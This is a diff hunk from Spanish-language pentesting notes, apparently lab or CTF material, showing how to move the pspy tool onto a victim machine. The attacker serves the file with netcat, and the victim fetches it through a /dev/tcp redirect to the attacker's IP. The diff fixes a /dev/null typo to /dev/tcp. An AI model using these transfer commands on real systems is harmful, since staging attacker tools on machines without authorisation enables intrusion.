@@ -15,8 +15,8 @@ Para pasarnos el pspy desde nuestra maquina a la maquina victima
 Desde nuestra maquina: nc -nlvp Puerto < NombreDelArchivo
 Ejemplo desde nuestra maquina: nc -nlvp 443 < pspy
 
-Desde la maquina victima: cat < /dev/null/IpDeNuestraMaquina/Puerto > NombreDelArchivo
-Ejemplo desde la maquina victima: cat < /dev/null/10.10.11.130/443 > pspy
+Desde la maquina victima: cat < /dev/tcp/IpDeNuestraMaquina/Puerto > NombreDelArchivo
+Ejemplo desde la maquina victima: cat < /dev/tcp/10.10.11.130/443 > pspy
 ```
 Para mas informacion sobre el comando [[nc -nlvp 443]]
 
